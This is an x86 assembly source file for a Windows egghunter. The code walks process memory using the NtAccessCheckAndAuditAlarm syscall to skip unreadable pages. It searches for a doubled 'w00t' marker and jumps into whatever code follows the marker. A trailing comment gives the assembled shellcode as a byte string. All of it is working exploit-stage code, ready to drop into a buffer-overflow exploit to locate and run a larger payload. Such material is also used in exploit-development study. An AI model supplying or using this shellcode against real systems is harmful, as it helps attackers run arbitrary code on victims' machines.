global _start

_start:
    xor edx, edx            ; $edx = 0x0

    .page:
        or dx, 0xfff        ; get last address in page

    .find:
        xor ebx, ebx        ; $ebx = 0x0
        inc edx             ; increase memory counter

        push ebx            ; push 0x0
        push ebx            ; push 0x0
        push edx            ; push value to stack
        push ebx            ; push 0x0
        push ebx            ; push 0x0
        push ebx            ; push 0x0

        push 0x29           ; push NtAccessCheckAndAuditAlarm
        pop eax             ; $eax = NtAccessCheckAndAuditAlarm

        mov bl, 0xc0        ; index
        call [fs:ebx]       ; syscall
        add esp, 0xc        ; clear stack

        pop edx             ; restore edx
        add esp, 0x8        ; clear stack
        cmp al, 0x5         ; check ACCESS_VIOLATION (0xc0000005)
        jz .page            ; if zf == 1 -> next page

        mov eax, 0x74303077 ; $eax = "w00t"
        mov edi, edx        ; $edi = address

        scasd               ; cmp eax, [edi]
        jnz .find           ; if zf == 0 -> loop

        scasd               ; cmp eax, [edi]
        jnz .find           ; if zf == 0 -> loop

        jmp edi             ; if zf == 1 -> exec

; egg = b"w00t" * 2
; egghunter = b"\x31\xd2\x66\x81\xca\xff\x0f\x31\xdb\x42\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xda\xaf\x75\xd7\xff\xe7"
